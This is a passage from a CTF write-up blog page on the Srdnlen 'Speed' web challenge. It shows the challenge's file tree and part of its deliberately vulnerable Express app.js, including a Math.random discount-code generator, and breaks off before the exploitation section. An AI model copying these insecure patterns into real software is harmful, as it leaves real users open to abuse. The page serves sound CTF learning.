<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Srdnlen - Speed" />
<meta name="author" content="Anas" />
<meta property="og:locale" content="en" />
<meta name="description" content="Enumeration Reading source code Interesting points Identifying vulnerabilities" />
<meta property="og:description" content="Enumeration Reading source code Interesting points Identifying vulnerabilities" />
<link rel="canonical" href="https://github.com/NullBrunk/posts/SrdnlenCTF2025-racecondition-copy/" />
<meta property="og:url" content="https://github.com/NullBrunk/posts/SrdnlenCTF2025-racecondition-copy/" />
<meta property="og:site_name" content="NullBrunk" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-01-18T16:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Srdnlen - Speed" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Anas","url":"https://github.com/NullBrunk/"},"dateModified":"2025-07-18T10:54:11+00:00","datePublished":"2025-01-18T16:00:00+00:00","description":"Enumeration Reading source code Interesting points Identifying vulnerabilities","headline":"Srdnlen - Speed","mainEntityOfPage":{"@type":"WebPage","@id":"https://github.com/NullBrunk/posts/SrdnlenCTF2025-racecondition-copy/"},"url":"https://github.com/NullBrunk/posts/SrdnlenCTF2025-racecondition-copy/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Srdnlen - Speed | NullBrunk
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="NullBrunk">
<meta name="application-name" content="NullBrunk">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/favicons/logo.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">NullBrunk</a>
    <p class="site-subtitle fst-italic mb-0">Web pentester, CTF player.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
          
          <li class="nav-item">
            <a href="/ctfs/" class="nav-link">
              <i class="fa-fw fas fa-flag"></i>
              

              <span>CTFS</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/tools/" class="nav-link">
              <i class="fa-fw fas fas fa-code"></i>
              

              <span>TOOLS</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/prog/" class="nav-link">
              <i class="fa-fw fas fa-screwdriver-wrench"></i>
              

              <span>PROG</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/tags/" class="nav-link">
              <i class="fa-fw fas fa-tags"></i>
              

              <span>TAGS</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
          
          <li class="nav-item">
            <a href="/about/" class="nav-link">
              <i class="fa-fw fas fa-info-circle"></i>
              

              <span>ABOUT</span>
            </a>
          </li>
        
        <!-- .nav-item -->
      
        
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap justify-content-center align-items-center w-100">
    <a href="https://ctftime.org/user/157452" aria-label="github" target="_blank" rel="noopener noreferrer">
      <i class="fa-regular fa-font-awesome"></i>
    </a>


    
      

      
        <a
          href="https://www.root-me.org/NullBrunk?q=%2FNullbrunk"
          aria-label="root-me"
          

          

          

          
        >
          <i class="fas fa-skull"></i>
        </a>
      
    
      

      
        <a
          href="https://github.com/nullbrunk"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://www.linkedin.com/in/anas-idiri-b05733229"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!--  include topbar.html lang=lang -->

        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11   col-xl-9  px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->










<header id="topbar-wrapper" aria-label="Top Bar">
    <div id="topbar" class="d-flex align-items-center justify-content-between h-100" >
        <nav id="breadcrumb" aria-label="Breadcrumb">
            <span><a href="/">Home</a></span>
             

            
                <span>
                 <a href="/categories/writeups/">Writeups</a>
                </span>
            
                <span>
                 <a href="/categories/ctftime2025/">CTFTime2025</a>
                </span>
            
                <span>
                 <a href="/categories/srdnlen/">Srdnlen</a>
                </span>
            

             
             
            

            
             
            
            <span>Srdnlen - Speed</span>
        </nav>
    </div>
</header>

<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>Srdnlen - Speed</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737216000"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Jan 18, 2025
</time>

      </span>

      <!-- lastmod date -->
      
        <span>
          Updated
          <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1752836051"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Jul 18, 2025
</time>

        </span>
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                <a href="https://github.com/NullBrunk/">Anas</a>
                
              
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="3242 words"
>
  <em>18 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">Srdnlen - Speed</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">Srdnlen - Speed</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <ol>
  <li>Enumeration
    <ul>
      <li><a href="#reading-source-code">Reading source code</a></li>
      <li><a href="#interesting-points">Interesting points</a></li>
      <li><a href="#identifying-vulnerabilities">Identifying vulnerabilities</a></li>
    </ul>
  </li>
  <li>Exploitation
    <ul>
      <li><a href="#exploiting-the-vulnerability">Exploiting the vulnerability</a></li>
      <li><a href="#scripting">Scripting</a></li>
      <li><a href="#getting-the-flag">Getting the flag</a></li>
    </ul>
  </li>
</ol>

<hr />

<h1 id="enumeration">Enumeration</h1>

<h2 id="reading-source-code"><span class="me-2">Reading source code</span><a href="#reading-source-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div file="structure" class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="structure"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre>├── docker-compose.yml
├── Dockerfile
├── init.js
├── mongo.js
├── package.json
├── server
│   ├── app.js
│   └── routes.js
├── models
│   ├── discountCodes.js
│   ├── product.js
│   ├── user.js
│   └── userproduct.js
└── webviews
    ├── error.hbs
    ├── home.hbs
    ├── layouts
    │   └── base.hbs
    ├── notfound.hbs
    ├── redeemVoucher.hbs
    ├── register-user.hbs
    ├── store.hbs
    ├── success.hbs
    └── user-login.hbs
</pre></td></tr></tbody></table></code></div></div>

<p>We’re only interested in <code class="language-plaintext highlighter-rouge">app.js</code>, <code class="language-plaintext highlighter-rouge">route.js</code> and the files in <code class="language-plaintext highlighter-rouge">models/</code>, because the logic is located in these files:</p>

<details id="appjs">
  <summary>app.js</summary>

  <div file="index.js" class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="index.js"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">path</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">body-parser</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">mongoose</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mongoose</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">User</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../models/user</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">Product</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../models/product</span><span class="dl">'</span><span class="p">);</span> 
<span class="kd">const</span> <span class="nx">DiscountCodes</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../models/discountCodes</span><span class="dl">'</span><span class="p">);</span> 
<span class="kd">const</span> <span class="nx">passport</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">passport</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="p">{</span> <span class="nx">engine</span> <span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express-handlebars</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="p">{</span> <span class="na">Strategy</span><span class="p">:</span> <span class="nx">JwtStrategy</span> <span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">passport-jwt</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">cookieParser</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">cookie-parser</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">function</span> <span class="nf">DB</span><span class="p">(</span><span class="nx">DB_URI</span><span class="p">,</span> <span class="nx">dbName</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">((</span><span class="nx">res</span><span class="p">,</span> <span class="nx">_</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">mongoose</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">strictQuery</span><span class="dl">'</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
        <span class="nx">mongoose</span>
            <span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="nx">DB_URI</span><span class="p">,</span> <span class="p">{</span> <span class="na">useNewUrlParser</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">useUnifiedTopology</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">dbName</span> <span class="p">})</span>
            <span class="p">.</span><span class="nf">then</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nf">res</span><span class="p">());</span>
    <span class="p">});</span>
<span class="p">}</span>

<span class="c1">// Generate a random discount code</span>
<span class="kd">const</span> <span class="nx">generateDiscountCode</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">characters</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="dl">'</span><span class="p">;</span>
    <span class="kd">let</span> <span class="nx">discountCode</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">12</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">discountCode</span> <span class="o">+=</span> <span class="nx">characters</span><span class="p">.</span><span class="nf">charAt</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span> <span class="o">*</span> <span class="nx">characters</span><span class="p">.</span><span class="nx">length</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">discountCode</span><span class="p">;</span>
<span class="p">};</span>



<span class="k">async</span> <span class="kd">function</span> <span class="nf">App</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>
    <span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nx">passport</span><span class="p">.</span><span class="nf">initialize</span><span class="p">());</span>
    <span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nf">cookieParser</span><span class="p">());</span>
    <span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nf">json</span><span class="p">());</span>

    <span class="nx">app</span><span class="p">.</span><span class="nf">engine</span><span class="p">(</span><span class="dl">'</span><span class="s1">hbs</span><span class="dl">'</span><span class="p">,</span> <span class="nf">engine</span><span class="p">({</span> <span class="na">extname</span><span class="p">:</span> <span class="dl">'</span><span class="s1">.hbs</span><span class="dl">'</span><span class="p">,</span> <span class="na">defaultLayout</span><span class="p">:</span> <span class="dl">'</span><span class="s1">base</span><span class="dl">'</span> <span class="p">}));</span>

    <span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nf">static</span><span class="p">(</span><span class="dl">'</span><span class="s1">static</span><span class="dl">'</span><span class="p">));</span>
    <span class="nx">app</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">view engine</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">hbs</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">app</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">views</span><span class="dl">'</span><span class="p">,</span> <span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="dl">'</span><span class="s1">../webviews</span><span class="dl">'</span><span class="p">));</span>

    <span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./routes</span><span class="dl">'</span><span class="p">));</span>

    <span class="nx">passport</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">user-local</span><span class="dl">'</span><span class="p">,</span> <span class="nx">User</span><span class="p">.</span><span class="nf">createStrategy</span><span class="p">());</span>
    <span class="kd">const</span> <span class="nx">option</span> <span class="o">=</span> <span class="p">{</span>
        <span class="na">secretOrKey</span><span class="p">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">JWT_SECRET</span><span class="p">,</span>
        <span class="na">jwtFromRequest</span><span class="p">:</span> <span class="p">(</span><span class="nx">req</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">req</span><span class="p">?.</span><span class="nx">cookies</span><span class="p">?.[</span><span class="dl">'</span><span class="s1">jwt</span><span class="dl">'</span><span class="p">],</span>
        <span class="na">algorithms</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">HS256</span><span class="dl">'</span><span class="p">],</span>
    <span class="p">};</span>

    

    <span class="nx">passport</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span>
        <span class="k">new</span> <span class="nc">JwtStrategy</span><span class="p">(</span><span class="nx">option</span><span class="p">,</span> <span class="p">(</span><span class="nx">payload</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nx">User</span><span class="p">.</span><span class="nf">findOne</span><span class="p">({</span> <span class="na">_id</span><span class="p">:</span> <span class="nx">payload</span><span class="p">.</span><span class="nx">userId</span> <span class="p">})</span>
                <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">user</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
                    <span class="nf">next</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="p">{</span> <span class="na">userId</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">_id</span> <span class="p">}</span> <span class="o">||</span> <span class="kc">false</span><span class="p">);</span>
                <span class="p">})</span>
                <span class="p">.</span><span class="k">catch</span><span class="p">((</span><span class="nx">_</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nf">next</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="kc">false</span><span class="p">));</span>
        <span class="p">})</span>
    <span class="p">);</span>

    <span class="kd">const</span> <span class="nx">products</span> <span class="o">=</span> <span class="p">[</span>
        <span class="p">{</span> <span class="na">productId</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="na">Name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Lightning McQueen Toy</span><span class="dl">"</span><span class="p">,</span> <span class="na">Description</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Ka-chow! This toy goes as fast as Lightning himself.</span><span class="dl">"</span><span class="p">,</span> <span class="na">Cost</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Free</span><span class="dl">"</span> <span class="p">},</span>
        <span class="p">{</span> <span class="na">productId</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="na">Name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Mater's Tow Hook</span><span class="dl">"</span><span class="p">,</span> <span class="na">Description</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Need a tow? Mater's here to save the day (with a little dirt on the side).</span><span class="dl">"</span><span class="p">,</span> <span class="na">Cost</span><span class="p">:</span> <span class="dl">"</span><span class="s2">1 Point</span><span class="dl">"</span> <span class="p">},</span>
        <span class="p">{</span> <span class="na">productId</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span> <span class="na">Name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Doc Hudson's Racing Tires</span><span class="dl">"</span><span class="p">,</span> <span class="na">Description</span><span class="p">:</span> <span class="dl">"</span><span class="s2">They're not just any tires, they're Doc Hudson's tires. Vintage!</span><span class="dl">"</span><span class="p">,</span> <span class="na">Cost</span><span class="p">:</span> <span class="dl">"</span><span class="s2">2 Points</span><span class="dl">"</span> <span class="p">},</span>
        <span class="p">{</span> 
            <span class="na">productId</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span> 
            <span class="na">Name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Lightning McQueen's Secret Text</span><span class="dl">"</span><span class="p">,</span> 
            <span class="na">Description</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Unlock Lightning's secret racing message! Only the fastest get to know the hidden code.</span><span class="dl">"</span><span class="p">,</span> 
            <span class="na">Cost</span><span class="p">:</span> <span class="dl">"</span><span class="s2">50 Points</span><span class="dl">"</span><span class="p">,</span> 
            <span class="na">FLAG</span><span class="p">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span> <span class="o">||</span> <span class="dl">'</span><span class="s1">SRDNLEN{fake_flag}</span><span class="dl">'</span> 
        <span class="p">}</span>
    <span class="p">];</span>
    

    <span class="k">for </span><span class="p">(</span><span class="kd">const</span> <span class="nx">productData</span> <span class="k">of</span> <span class="nx">products</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">existingProduct</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">Product</span><span class="p">.</span><span class="nf">findOne</span><span class="p">({</span> <span class="na">productId</span><span class="p">:</span> <span class="nx">productData</span><span class="p">.</span><span class="nx">productId</span> <span class="p">});</span>
        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">existingProduct</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">await</span> <span class="nx">Product</span><span class="p">.</span><span class="nf">create</span><span class="p">(</span><span class="nx">productData</span><span class="p">);</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="s2">`Inserted productId: </span><span class="p">${</span><span class="nx">productData</span><span class="p">.</span><span class="nx">productId</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
